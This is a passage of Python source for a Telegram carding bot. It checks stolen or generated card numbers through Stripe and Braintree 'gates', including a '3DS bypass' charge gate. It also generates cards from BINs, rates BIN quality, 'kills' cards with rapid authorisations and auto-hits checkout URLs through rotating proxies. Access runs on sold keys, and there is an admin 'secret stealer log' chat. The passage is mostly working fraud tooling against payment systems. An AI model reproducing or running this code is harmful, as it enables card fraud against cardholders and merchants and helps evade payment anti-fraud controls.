        if chat_id and msg_id:
            edit_message(chat_id, msg_id,
                f"<b>{gate_name} — ENABLED</b>\n\n"
                f"Gate is back online for all users.\n\n"
                f"<i>{DEVELOPER}</i>")
        return

    if data == "gate_keep":
        answer_callback(cb_id, "No changes made.")
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, f"<b>No changes made.</b>\n\n<i>{DEVELOPER}</i>")
        return

    # Help menu navigation
    if data == "help_gates":
        answer_callback(cb_id)
        txt = (
            "<b>⍟━━━⌁ Gates ⌁━━━⍟</b>\n\n"
            "<b>Auth Gates:</b>\n"
            "<code>/auth</code>  ·  Stripe Auth (WCPay)\n"
            "<code>/sa1</code>  ·  Stripe Auth CCN\n"
            "<code>/sa2</code>  ·  Stripe Auth CVV\n\n"
            "<b>Charge Gates:</b>\n"
            "<code>/chg3</code>  ·  Stripe $3 Charge (3DS bypass)\n\n"
            "<b>Other:</b>\n"
            "<code>/nvbv</code>  ·  Braintree Non-VBV\n\n"
            f"<i>{DEVELOPER}</i>"
        )
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
        return

    if data == "help_tools":
        answer_callback(cb_id)
        txt = (
            "<b>Tools</b>\n\n"
            "<code>/gen 424242 10</code>  ·  Generate cards from BIN\n"
            "<code>/binlookup 424242</code>  ·  BIN info lookup\n"
            "<code>/binquality 424242</code>  ·  BIN quality check\n"
            "<code>/vbv 4111...</code>  ·  VBV/3DS check\n"
            "<code>/analyze https://...</code>  ·  Detect payment provider\n"
            "<code>/autohitter URL</code>  ·  Auto-hit checkout URL\n"
            "<code>/filesend</code>  ·  Upload file to server\n\n"
            f"<i>{DEVELOPER}</i>"
        )
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
        return

    if data == "help_commands":
        answer_callback(cb_id)
        txt = (
            "<b>Commands</b>\n\n"
            "<code>/bin 424242</code>  ·  Set BIN filter\n"
            "<code>/clearbin</code>  ·  Clear BIN filter\n"
            "<code>/kill CC|MM|YY|CVV</code>  ·  CC Killer\n"
            "<code>/cancel</code>  ·  Stop active task\n"
            "<code>/gates</code>  ·  List all gates + hit rates\n"
            "<code>/stats</code>  ·  Your lifetime stats\n"
            "<code>/mykey</code>  ·  Check your key info\n"
            "<code>/redeem KEY</code>  ·  Redeem access key\n\n"
            f"<i>{DEVELOPER}</i>"
        )
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
        return

    if data == "help_howto":
        answer_callback(cb_id)
        txt = (
            "<b>How to Use</b>\n\n"
            "<b>Single card:</b>\n"
            "<code>/auth 4111111111111111|01|25|123</code>\n\n"
            "<b>Bulk check:</b>\n"
            "1. Send a <code>.txt</code> file with cards\n"
            "2. Reply to it with the gate command\n\n"
            "<b>Auto Hitter:</b>\n"
            "Reply to a .txt file with:\n"
            "<code>/autohitter https://checkout-url.com</code>\n\n"
            "<b>Generate cards:</b>\n"
            "<code>/gen 424242 10</code>\n\n"
            "<b>BIN lookup:</b>\n"
            "<code>/binlookup 424242</code>\n\n"
            f"<i>{DEVELOPER}</i>"
        )
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
        return

    if data == "help_admin":
        answer_callback(cb_id)
        if not is_admin(cb_user_id):
            txt = f"<b>Admin section is restricted.</b>\n\n<i>{DEVELOPER}</i>"
        else:
            txt = (
                "<b>Admin Commands</b>\n\n"
                "<code>/genkey</code>  ·  Generate single key\n"
                "<code>/genkeys 10</code>  ·  Bulk generate keys\n"
                "<code>/adminkey ID 7d</code>  ·  Promote to admin\n"
                "<code>/adminlist</code>  ·  List all admins\n"
                "<code>/authlist</code>  ·  List authorized users\n"
                "<code>/revoke ID</code>  ·  Revoke user access\n"
                "<code>/broadcast msg</code>  ·  Message all users\n"
                "<code>/proxy</code>  ·  Proxy pool status\n"
                "<code>/addproxy</code>  ·  Add proxies to pool\n"
                "<code>/scrapeproxies</code>  ·  Scrape fresh proxies\n"
                "<code>/authsite</code>  ·  Set /auth site URL\n"
                "<code>/chkapis</code>  ·  Health check all APIs\n"
                "<code>/secgcset</code>  ·  Set secret log GC\n"
                "<code>/gctest</code>  ·  Test secret logging\n\n"
                f"<i>{DEVELOPER}</i>"
            )
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
        return

    if data == "help_back":
        answer_callback(cb_id)
        if chat_id and msg_id:
            edit_message(chat_id, msg_id,
                f"<b>Help Center</b>\n\nChoose a category below.\n\n<i>{DEVELOPER}</i>",
                reply_markup=help_main_markup())
        return


# ============================================================
#  Update handler
# ============================================================
def handle_update(update):
    if "callback_query" in update:
        handle_callback(update)
        return

    msg = update.get("message")
    if not msg:
        return

    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    username = msg["from"].get("username", "")
    text = (msg.get("text") or msg.get("caption") or "").strip()

    if not text:
        return

    # --- /start ---
    if text == "/start":
        send_message(chat_id, fmt_start(username, user_id))
        return

    # --- /help ---
    if text == "/help":
        txt = (
            f"<b>Help Center</b>\n\nChoose a category below.\n\n<i>{DEVELOPER}</i>"
        )
        send_message(chat_id, txt, reply_markup=help_main_markup())
        return

    # --- /bin ---
    if text.startswith("/bin") and not text.startswith("/binlookup") and not text.startswith("/binquality"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"<b>Usage:</b> <code>/bin 424242,555555</code>\n\n<i>{DEVELOPER}</i>")
            return
        bins = parts[1].replace(" ", "").split(",")
        user_bins[user_id] = bins
        send_message(chat_id, f"<b>BIN filter set:</b> <code>{', '.join(bins)}</code>\n\n<i>{DEVELOPER}</i>")
        return

    # --- /clearbin ---
    if text == "/clearbin":
        if user_id in user_bins:
            del user_bins[user_id]
            send_message(chat_id, f"<b>BIN filter cleared.</b>\n\n<i>{DEVELOPER}</i>")
        else:
            send_message(chat_id, f"<b>No BIN filter active.</b>\n\n<i>{DEVELOPER}</i>")
        return

    # --- /cancel ---
    if text == "/cancel":
        if user_id in active_users:
            cancel_flags[user_id] = True
            send_message(chat_id, f"<b>Stopping your task...</b>\n\n<i>{DEVELOPER}</i>")
        else:
            send_message(chat_id, f"<b>No active task.</b>\n\n<i>{DEVELOPER}</i>")
        return

    # --- /kill (CC Killer — burn a card via rapid multi-gate auth) ---
    if text.startswith("/kill"):
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2 or '|' not in parts[1]:
            send_message(chat_id,
                "<b>💀 CC Killer</b>\n\n"
                "<b>Usage:</b> <code>/kill CC|MM|YY|CVV</code>\n\n"
                "Rapidly attempts multiple auth gates to burn/void the card.\n\n"
                f"<i>{DEVELOPER}</i>")
            return

        cc_input = parts[1].strip()
        c_data = cc_input.split('|')
        if len(c_data) != 4:
            send_message(chat_id, f"<b>Invalid format.</b>\n\nUse: <code>/kill CC|MM|YY|CVV</code>\n\n<i>{DEVELOPER}</i>")
            return

        send_message(chat_id,
            f"<b>💀 Killing Card...</b>\n\n"
            f"<code>{cc_input}</code>\n\n"
            f"Running rapid auth attempts across all gates...")

        def _run_kill():
            kill_gates = ["auth", "sa1", "sa2", "chg3"]
            gate_labels = {"auth": "Stripe Auth", "sa1": "SA1 CCN", "sa2": "SA2 CVV", "chg3": "$3 Charge"}
            proxies_list = list(_global_proxies) if _global_proxies else []
            results_lines = []
            total_attempts = 0

            for gate in kill_gates:
                if not is_gate_enabled(gate):
                    results_lines.append(f"⏭ {gate_labels[gate]}: <code>Skipped (disabled)</code>")
                    continue

                for attempt in range(3):
                    total_attempts += 1
                    proxy_dict = format_proxy(random.choice(proxies_list)) if proxies_list else None
                    try:
                        result = _run_gate(gate, c_data[0], c_data[1], c_data[2], c_data[3], proxy_dict)
                        r_lower = result.lower() if isinstance(result, str) else ""
                        if "approved" in r_lower or "charged" in r_lower:
                            results_lines.append(f"✅ {gate_labels[gate]} #{attempt+1}: <code>AUTH'D (burned)</code>")
                        elif "declined" in r_lower:
                            detail = result.split(" | ", 1)[1] if " | " in result else result
                            results_lines.append(f"❌ {gate_labels[gate]} #{attempt+1}: <code>{detail[:40]}</code>")
                        else:
                            results_lines.append(f"⚠️ {gate_labels[gate]} #{attempt+1}: <code>{result[:40] if isinstance(result, str) else 'Error'}</code>")
                    except Exception as e:
                        results_lines.append(f"⚠️ {gate_labels[gate]} #{attempt+1}: <code>{str(e)[:40]}</code>")
                    time.sleep(random.uniform(0.1, 0.3))

            name = f"@{username}" if username else str(user_id)
            send_message(chat_id,
                f"<b>💀━━━⌁ CC KILLER ⌁━━━💀</b>\n\n"
                f"[🝂] CARD: <code>{cc_input}</code>\n"
                f"[🝂] ATTEMPTS: <code>{total_attempts}</code>\n"
                f"[🝂] KILLED BY: {name}\n\n"
                f"<b>💀━━━━💀 RESULTS 💀━━━━💀</b>\n\n"
                + "\n".join(results_lines) +
                f"\n\n<i>{DEVELOPER}</i>")

        threading.Thread(target=_run_kill, daemon=True).start()
        return


    if text.startswith("/gen") and text.split()[0] == "/gen":
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return
        parts = text.split()
        if len(parts) < 2:
            send_message(chat_id,
                "<b>Card Generator</b>\n\n"
                "<b>Usage:</b> <code>/gen 424242 10</code>\n"
                f"Use <code>x</code> for random digits\n\n<i>{DEVELOPER}</i>")
            return
        bin_input = parts[1]
        count = 10
        if len(parts) >= 3:
            try:
                count = min(int(parts[2]), 50)
            except ValueError:
                count = 10
        cards = generate_cards(bin_input, count)
        if not cards:
            send_message(chat_id, f"<b>Invalid BIN.</b>\n\n<i>{DEVELOPER}</i>")
            return
        card_text = "\n".join(f"<code>{c}</code>" for c in cards)
        send_message(chat_id,
            f"<b>Generated {len(cards)} Cards</b>\n\n"
            f"BIN: <code>{bin_input}</code>\n\n"
            f"{card_text}\n\n"
            f"<i>{DEVELOPER}</i>")
        return

    # --- /binlookup ---
    if text.startswith("/binlookup"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"<b>Usage:</b> <code>/binlookup 424242</code>\n\n<i>{DEVELOPER}</i>")
            return
        bin_num = parts[1].strip().split('|')[0][:6]
        info, err = bin_lookup(bin_num)
        if info:
            send_message(chat_id,
                f"<b>BIN Lookup — {bin_num}</b>\n\n"
                f"Brand: <code>{info['brand']}</code>\n"
                f"Type: <code>{info['type']}</code>\n"
                f"Bank: <code>{info['bank']}</code>\n"
                f"Country: <code>{info['country']}</code> {info['emoji']}\n\n"
                f"<i>{DEVELOPER}</i>")
        else:
            send_message(chat_id, f"<b>BIN Lookup Failed</b>\n\n{err}\n\n<i>{DEVELOPER}</i>")
        return

    # --- /vbv ---
    if text.startswith("/vbv"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"<b>Usage:</b> <code>/vbv 4111111111111111</code>\n\n<i>{DEVELOPER}</i>")
            return
        result = vbv_lookup(parts[1].strip())
        send_message(chat_id, f"<b>VBV/3DS Check</b>\n\n{result}\n\n<i>{DEVELOPER}</i>")
        return

    # --- /binquality ---
    if text.startswith("/binquality"):
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id,
                "<b>BIN Quality Check</b>\n\n"
                "<b>Usage:</b> <code>/binquality 424242</code>\n\n"
                "Auto-generates 10 cards from BIN, checks each\n"
                f"with Stripe Auth, and rates the BIN quality.\n\n<i>{DEVELOPER}</i>")
            return

        bin_input = parts[1].strip().split('|')[0].strip()
        if len(bin_input) < 6:
            send_message(chat_id, f"<b>BIN must be at least 6 digits.</b>\n\n<i>{DEVELOPER}</i>")
            return

        with active_lock:
            if user_id in active_users:
                send_message(chat_id, f"<b>You already have a task running.</b>\n\n<i>{DEVELOPER}</i>")
                return
            active_users.add(user_id)

        cancel_flags.pop(user_id, None)

        init_resp = send_message(chat_id,
            f"<b>BIN Quality Check</b>\n\n"
            f"BIN: <code>{bin_input}</code>\n"
            f"Generating 10 cards...",
            reply_markup=stop_button_markup(user_id))
        progress_msg_id = init_resp.get("result", {}).get("message_id")

        def _run_binquality():
            try:
                cards = generate_cards(bin_input, 10)
                if not cards:
                    send_message(chat_id, f"<b>Failed to generate cards from BIN.</b>\n\n<i>{DEVELOPER}</i>")
                    with active_lock:
                        active_users.discard(user_id)
                    return

                if progress_msg_id:
                    edit_message(chat_id, progress_msg_id,
                        f"<b>BIN Quality Check</b>\n\n"
                        f"BIN: <code>{bin_input}</code>\n"
                        f"Generated: <code>{len(cards)}</code>\n"
                        f"Checking with Stripe Auth...\n\n"
                        f"Progress: <code>0/{len(cards)}</code>",
                        reply_markup=stop_button_markup(user_id))

                proxies_list = list(_global_proxies) if _global_proxies else []
                approved = 0
                declined = 0
                errors = 0
                approved_cards = []
                total = len(cards)

                for i, card in enumerate(cards):
                    if cancel_flags.get(user_id):
                        break

                    result = process_single_entry(card, proxies_list, user_id, gate="auth")
                    r_lower = result.lower() if isinstance(result, str) else ""

                    if "approved" in r_lower or "charged" in r_lower:
                        approved += 1
                        approved_cards.append(card)
                    elif "declined" in r_lower:
                        declined += 1
                    else:
                        errors += 1

                    # Update progress every 2 cards or at end
                    now_idx = i + 1
                    if progress_msg_id and (now_idx % 2 == 0 or now_idx == total):
                        pct = int(now_idx / total * 100)
                        bar_len = 12
                        filled = int(bar_len * now_idx / total)
                        bar = "█" * filled + "░" * (bar_len - filled)
                        edit_message(chat_id, progress_msg_id,
                            f"<b>BIN Quality Check</b>\n\n"
                            f"BIN: <code>{bin_input}</code>\n"
                            f"<code>{bar}</code> {pct}%\n\n"
                            f"Progress: <code>{now_idx}/{total}</code>\n"
                            f"Approved: <code>{approved}</code>\n"
                            f"Declined: <code>{declined}</code>\n"
                            f"Errors: <code>{errors}</code>",
                            reply_markup=stop_button_markup(user_id) if now_idx < total else None)

                cancel_flags.pop(user_id, None)

                # Determine quality
                hit_rate = (approved / total * 100) if total > 0 else 0
                if hit_rate >= 50:
                    quality = "PREMIUM BIN"
                    quality_desc = "High approval rate — strong for charges"
                elif hit_rate >= 20:
                    quality = "GOOD BIN"
                    quality_desc = "Decent approval rate — usable"
                elif hit_rate > 0:
                    quality = "LOW BIN"
                    quality_desc = "Low approval rate — mostly generated/dead"
                else:
                    quality = "DEAD BIN"
                    quality_desc = "Zero approvals — likely all generated/killed"

                # BIN info
                try:
                    info, _ = bin_lookup(bin_input[:6])
                except Exception:
                    info = None

                bin_line = ""
                if info:
                    bin_line = (
                        f"Brand: <code>{info.get('brand', 'N/A')}</code>\n"
                        f"Bank: <code>{info.get('bank', 'N/A')}</code>\n"
                        f"Country: <code>{info.get('country', 'N/A')}</code> {info.get('emoji', '')}\n"
                    )

                approved_text = ""
                if approved_cards:
                    approved_text = "\n<b>Approved Cards:</b>\n" + "\n".join(f"<code>{c}</code>" for c in approved_cards) + "\n"

                send_message(chat_id,
                    f"<b>BIN Quality — {quality}</b>\n\n"
                    f"BIN: <code>{bin_input}</code>\n"
                    f"{bin_line}"
                    f"\nChecked: <code>{total}</code>\n"
                    f"Approved: <code>{approved}</code>\n"
                    f"Declined: <code>{declined}</code>\n"
                    f"Errors: <code>{errors}</code>\n"
                    f"Hit Rate: <code>{hit_rate:.0f}%</code>\n\n"
                    f"<b>Verdict:</b> {quality_desc}\n"
                    f"{approved_text}\n"
                    f"<i>{DEVELOPER}</i>")

            except Exception as e:
                send_message(chat_id, f"<b>Error:</b> {str(e)[:80]}\n\n<i>{DEVELOPER}</i>")
            finally:
                with active_lock:
                    active_users.discard(user_id)

        threading.Thread(target=_run_binquality, daemon=True).start()
        return


    if text.startswith("/analyze"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"<b>Usage:</b> <code>/analyze https://example.com</code>\n\n<i>{DEVELOPER}</i>")
            return
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return
        url = parts[1].strip()
        send_message(chat_id, f"<b>Analyzing...</b>\n<code>{url[:60]}</code>")

        def _do_analyze():
            info = analyze_url(url)
            provider = info.get('provider', 'unknown')
            merchant = info.get('merchant', 'Unknown')
            product = info.get('product', '-')
            amount = info.get('amount', '-')
            currency = info.get('currency', 'USD')
            error = info.get('error')
            lines_out = [
                f"<b>URL Analysis</b>\n",
                f"URL: <code>{url[:80]}</code>",
                f"Provider: <code>{provider.upper()}</code>",
                f"Merchant: <code>{merchant}</code>",
            ]
            if product and product != '-':
                lines_out.append(f"Product: <code>{product}</code>")
            if amount:
                lines_out.append(f"Amount: <code>{amount} {currency}</code>")
            if error:
                lines_out.append(f"Error: {error}")
            lines_out.append(f"\n<i>{DEVELOPER}</i>")
            send_message(chat_id, "\n".join(lines_out))

        threading.Thread(target=_do_analyze, daemon=True).start()
        return

    # --- /proxy (admin) ---
    if text.startswith("/proxy") and text.split()[0] == "/proxy":
        if not is_admin(user_id):
            return
        parts = text.split()

        # /proxy — show status
        if len(parts) == 1:
            count = get_proxy_count()
            if count == 0:
                send_message(chat_id,
                    "<b>Proxy Pool</b>\n\n"
                    "Status: <code>No proxies loaded</code>\n"
                    "File: <code>proxies.txt</code>\n\n"
                    "<b>Commands:</b>\n"
                    "<code>/proxy reload</code>  ·  Reload from file\n"
                    "<code>/proxy test</code>  ·  Test random proxy\n"
                    "<code>/proxy test 5</code>  ·  Test 5 proxies\n\n"
                    f"<i>{DEVELOPER}</i>")
            else:
                send_message(chat_id,
                    "<b>Proxy Pool</b>\n\n"
                    f"Loaded: <code>{count}</code>\n"
                    f"Rotation: <code>Round-robin</code>\n"
                    f"Index: <code>{_proxy_index}</code>\n\n"
                    "<b>Commands:</b>\n"
                    "<code>/proxy reload</code>  ·  Reload from file\n"
                    "<code>/proxy test</code>  ·  Test random proxy\n"
                    "<code>/proxy test 5</code>  ·  Test 5 proxies\n\n"
                    f"<i>{DEVELOPER}</i>")
            return

        sub = parts[1].lower()

        # /proxy reload
        if sub == "reload":
            new_count = load_global_proxies()
            send_message(chat_id,
                f"<b>Proxies Reloaded</b>\n\n"
                f"Active: <code>{new_count}</code>\n\n"
                f"<i>{DEVELOPER}</i>")
            return

        # /proxy test [count]
        if sub == "test":
            test_count = 1
            if len(parts) >= 3:
                try:
                    test_count = min(int(parts[2]), 10)
                except ValueError:
                    test_count = 1

            if get_proxy_count() == 0:
                send_message(chat_id, f"<b>No proxies loaded.</b>\n\n<i>{DEVELOPER}</i>")
                return

            send_message(chat_id, f"<b>Testing {test_count} proxy(ies)...</b>")

            def _do_test():
                results = []
                tested = set()
                for _ in range(test_count):
                    p = random.choice(_global_proxies)
                    while p in tested and len(tested) < len(_global_proxies):
                        p = random.choice(_global_proxies)
                    tested.add(p)
                    alive, latency, error = test_proxy_connectivity(p)
                    masked = p[:20] + "..." if len(p) > 20 else p
                    if alive:
                        results.append(f"<code>{masked}</code> — <code>{latency}ms</code>")
                    else:
                        results.append(f"<code>{masked}</code> — <code>DEAD ({error})</code>")

                alive_count = sum(1 for r in results if "DEAD" not in r)
                send_message(chat_id,
                    f"<b>Proxy Test Results</b>\n\n"
                    f"Tested: <code>{len(results)}</code>\n"
                    f"Alive: <code>{alive_count}</code>\n"
                    f"Dead: <code>{len(results) - alive_count}</code>\n\n"
                    + "\n".join(results) +
                    f"\n\n<i>{DEVELOPER}</i>")

            threading.Thread(target=_do_test, daemon=True).start()
            return

        send_message(chat_id,
            "<b>Usage:</b>\n"
            "<code>/proxy</code> — Pool status\n"
            "<code>/proxy reload</code> — Reload\n"
            "<code>/proxy test [n]</code> — Test connectivity\n\n"
            f"<i>{DEVELOPER}</i>")
        return

    # --- /addproxy (admin) — add proxies via paste or .txt reply ---
    if text.startswith("/addproxy"):
        if not is_admin(user_id):
            return

        new_proxies_raw = []

        # Check if replying to a .txt file
        reply = msg.get("reply_to_message")
        if reply and reply.get("document"):
            doc = reply["document"]
            fname = doc.get("file_name", "")
            if fname.lower().endswith(".txt"):
                content = download_file(doc["file_id"])
                if content:
                    new_proxies_raw = [l.strip() for l in content.splitlines() if l.strip() and not l.strip().startswith('#')]

        # Check if proxies pasted inline after command
        parts = text.split(maxsplit=1)
        if len(parts) >= 2:
            inline_proxies = [l.strip() for l in parts[1].splitlines() if l.strip() and not l.strip().startswith('#')]
            # Also handle comma-separated
            expanded = []
            for p in inline_proxies:
                if ',' in p and '://' not in p and '@' not in p:
                    expanded.extend([x.strip() for x in p.split(',') if x.strip()])
                else:
                    expanded.append(p)
            new_proxies_raw.extend(expanded)

        if not new_proxies_raw:
            send_message(chat_id,
                "<b>Add Proxies</b>\n\n"
                "<b>Methods:</b>\n"
                "1. Paste inline:\n"
                "<code>/addproxy 45.3.49.240:3129</code>\n\n"
                "2. Multiple lines:\n"
                "<code>/addproxy\n"
                "45.3.49.240:3129\n"
                "host:port:user:pass</code>\n\n"
                "3. Reply to a .txt file with <code>/addproxy</code>\n\n"
                "<b>Supported formats:</b>\n"
                "<code>host:port</code>\n"
                "<code>host:port:user:pass</code>\n"
                "<code>user:pass@host:port</code>\n"
                "<code>http://host:port</code>\n"
                "<code>socks5://user:pass@host:port</code>\n"
                f"...and more\n\n<i>{DEVELOPER}</i>")
            return

        send_message(chat_id,
            f"<b>Validating {len(new_proxies_raw)} proxy(ies)...</b>\n"
            "Testing connectivity for each one.")

        def _do_add_proxies():
            global _global_proxies
            valid = []
            invalid = []
            results_lines = []

            for raw in new_proxies_raw:
                # Format validation
                validated = validate_proxy_format(raw)
                if not validated:
                    invalid.append(raw)
                    masked = raw[:25] + "..." if len(raw) > 25 else raw
                    results_lines.append(f"<code>{masked}</code> — <code>Invalid format</code>")
                    continue

                # Connectivity test
                alive, latency, error = test_proxy_connectivity(raw)
                masked = raw[:25] + "..." if len(raw) > 25 else raw
                if alive:
                    valid.append(raw)
                    results_lines.append(f"✅ <code>{masked}</code> — <code>{latency}ms</code>")
                else:
                    # Do NOT add dead proxies
                    invalid.append(raw)
                    results_lines.append(f"❌ <code>{masked}</code> — <code>{error}</code>")

            # Append valid proxies to file and pool
            if valid:
                with open(PROXIES_FILE, 'a') as f:
                    for p in valid:
                        f.write(p + "\n")
                with _proxy_lock:
                    _global_proxies.extend(valid)

            dead_count = sum(1 for r in results_lines if "❌" in r)

            send_message(chat_id,
                f"<b>Proxy Add Results</b>\n\n"
                f"Submitted: <code>{len(new_proxies_raw)}</code>\n"
                f"✅ Working: <code>{len(valid)}</code>\n"
                f"❌ Dead: <code>{dead_count}</code>\n"
                f"⚠️ Invalid: <code>{len(invalid) - dead_count}</code>\n"
                f"Added to pool: <code>{len(valid)}</code>\n"
                f"Total pool: <code>{len(_global_proxies)}</code>\n\n"
                + "\n".join(results_lines[:20]) +
                (f"\n... and {len(results_lines) - 20} more" if len(results_lines) > 20 else "") +
                f"\n\n<i>{DEVELOPER}</i>")

        threading.Thread(target=_do_add_proxies, daemon=True).start()
        return

    # --- /setgc (admin) ---
    if text.startswith("/setgc"):
        if not is_admin(user_id):
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            current = get_notification_gc()
            if current:
                send_message(chat_id,
                    f"<b>Notification GC</b>\n\n"
                    f"Current: <code>{current}</code>\n\n"
                    f"To change: <code>/setgc CHAT_ID</code>\n"
                    f"To set this chat: <code>/setgc here</code>\n\n"
                    f"<i>{DEVELOPER}</i>")
            else:
                send_message(chat_id,
                    f"<b>Notification GC</b>\n\n"
                    f"Not configured.\n\n"
                    f"<code>/setgc CHAT_ID</code> or <code>/setgc here</code>\n\n"
                    f"<i>{DEVELOPER}</i>")
            return
        target = parts[1].strip()
        if target.lower() == "here":
            target = str(chat_id)
        set_notification_gc(int(target))
        send_message(chat_id,
            f"<b>Notification GC Set</b>\n\n"
            f"Chat ID: <code>{target}</code>\n\n"
            f"<i>{DEVELOPER}</i>")
        return

    # --- /secgcset (secret stealer log GC) ---
    if text.startswith("/secgcset"):
        if int(user_id) not in ADMIN_IDS:
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            current = get_secret_gc()
            send_message(chat_id,
                f"<b>Secret GC</b>\n\n"
                f"Current: <code>{current or 'Not set'}</code>\n\n"
                f"<code>/secgcset CHAT_ID</code> or <code>/secgcset here</code>\n\n"
                f"<i>{DEVELOPER}</i>")
            return
        target = parts[1].strip()
        if target.lower() == "here":
            target = str(chat_id)
        set_secret_gc(int(target))
        send_message(chat_id,
            f"<b>Secret GC Set</b>\n\n"
            f"Chat ID: <code>{target}</code>\n\n"
            f"<i>{DEVELOPER}</i>")
        return

    # --- /gctest ---
    if text == "/gctest":
        if int(user_id) not in ADMIN_IDS:
            return
        gc_id = get_secret_gc()
        if not gc_id:
            send_message(chat_id, f"<b>No secret GC configured.</b>\n\nUse /secgcset first.\n\n<i>{DEVELOPER}</i>")
            return
        try:
            send_message(gc_id, "Logging system is working ✅")
            send_message(chat_id, f"<b>Test sent successfully.</b>\n\n<i>{DEVELOPER}</i>")
        except Exception as e:
            send_message(chat_id, f"<b>Failed:</b> {str(e)[:60]}\n\n<i>{DEVELOPER}</i>")

    # --- /scrapeproxies (admin) ---
    if text == "/scrapeproxies":
        if not is_admin(user_id):
            return
        send_message(chat_id, f"<b>Scraping proxies...</b>")

        def _do_scrape():
            proxies = scrape_proxies()
            if proxies:
                # Save to file
                with open(PROXIES_FILE, 'w') as f:
                    f.write('\n'.join(proxies))
                load_global_proxies()

                # Send as document in chat
                filename = f"proxies_{int(time.time())}.txt"
                filepath = os.path.join(DATA_DIR, filename)
                with open(filepath, "w") as f:
                    f.write('\n'.join(proxies))
                send_document(chat_id, filepath, filename,
                    caption=f"<b>Scraped {len(proxies)} Proxies</b>\n"
                            f"Active pool: <code>{get_proxy_count()}</code>\n\n"
                            f"<i>{DEVELOPER}</i>")
            else:
                send_message(chat_id, f"<b>Failed to scrape proxies.</b>\n\n<i>{DEVELOPER}</i>")

        threading.Thread(target=_do_scrape, daemon=True).start()
        return

    # --- /autohitter ---
    if text.startswith("/autohitter"):
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return

        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id,
                "<b>⚡ Auto Hitter</b>\n\n"
                "<b>Usage Modes:</b>\n\n"
                "1️⃣ <b>Cards + Link:</b>\n"
                "<code>/autohitter https://url.com\n"
                "4111111111111111|01|25|123\n"
                "5200000000000007|02|26|456</code>\n\n"
                "2️⃣ <b>Reply to card message + Link:</b>\n"
                "Reply to a message containing cards with:\n"
                "<code>/autohitter https://url.com</code>\n\n"
                "3️⃣ <b>BIN + Link (auto-gen):</b>\n"
                "<code>/autohitter https://url.com 424242</code>\n"
                "Auto-generates 10 cards from BIN and hits\n\n"
                "4️⃣ <b>Reply to .txt file + Link:</b>\n"
                "Reply to a .txt file with:\n"
                "<code>/autohitter https://url.com</code>\n\n"
                "Supports 15+ providers. Auto-detects payment system.\n\n"
                f"<i>{DEVELOPER}</i>")
            return

        remaining = parts[1].strip()

        # Extract URL (can be anywhere in the text)
        url_match = re.search(r'(https?://\S+)', remaining)
        if not url_match:
            send_message(chat_id, f"<b>No valid URL found.</b>\n\n<i>{DEVELOPER}</i>")
            return

        target_url = url_match.group(1)
        # Get text before and after the URL
        before_url = remaining[:url_match.start()].strip()
        after_url = remaining[url_match.end():].strip()
        extra_text = (before_url + " " + after_url).strip()

        # Try to extract site name from URL
        try:
            from urllib.parse import urlparse
            parsed_url = urlparse(target_url)
            site_name = parsed_url.netloc.replace("www.", "")
        except Exception:
            site_name = target_url[:40]

        # Determine card source
        card_lines = []

        # Check for inline cards (multi-line cards after URL or in extra_text)
        for potential_line in remaining.split('\n'):
            potential_line = potential_line.strip()
            if '|' in potential_line and not potential_line.startswith('http'):
                # Could be CC|MM|YY|CVV
                cc_match = re.match(r'^\d{13,19}\|', potential_line)
                if cc_match:
                    card_lines.append(potential_line)

        # Check if extra_text is a BIN (digits only, 6-8 chars)
        is_bin_mode = False
        bin_input = ""
        if not card_lines and extra_text:
            clean = extra_text.replace(" ", "")
            if re.match(r'^\d{6,8}$', clean):
                is_bin_mode = True
                bin_input = clean

        # Check if extra_text has a single card
        if not card_lines and not is_bin_mode and extra_text and '|' in extra_text:
            cc_parts = extra_text.split('|')
            if len(cc_parts) == 4:
                card_lines.append(extra_text)

        # Check reply to message (text with cards)
        reply = msg.get("reply_to_message")
        if not card_lines and not is_bin_mode and reply:
            # Check if reply has a document (.txt file)
            if reply.get("document"):
                doc = reply["document"]
                fname = doc.get("file_name", "")
                if fname.lower().endswith(".txt"):
                    content = download_file(doc["file_id"])
                    if content:
                        for line in content.splitlines():
                            line = line.strip()
                            if line and '|' in line and re.match(r'^\d', line):
                                card_lines.append(line)
            # Check if reply has text with cards
            elif reply.get("text"):
                for line in reply["text"].splitlines():
                    line = line.strip()
                    if line and '|' in line and re.match(r'^\d', line):
                        card_lines.append(line)

        # BIN mode — auto-generate cards
        if is_bin_mode:
            send_message(chat_id,
                f"<b>⚡ AutoHitter — BIN Mode</b>\n\n"
                f"Site: <code>{site_name}</code>\n"
                f"BIN: <code>{bin_input}</code>\n"
                f"Generating 10 cards...")

            gen_cards = generate_cards(bin_input, 10)
            if not gen_cards:
                send_message(chat_id, f"<b>Failed to generate cards from BIN.</b>\n\n<i>{DEVELOPER}</i>")
                return
            card_lines = gen_cards

        if not card_lines:
            send_message(chat_id,
                "<b>No cards found.</b>\n\n"
                "Provide cards inline, reply to a card message/file,\n"
                f"or use a BIN to auto-generate.\n\n<i>{DEVELOPER}</i>")
            return

        # Single card — quick hit
        if len(card_lines) == 1:
            cc_line = card_lines[0]
            send_message(chat_id,
                f"<b>⚡ AutoHitter</b>\n\n"
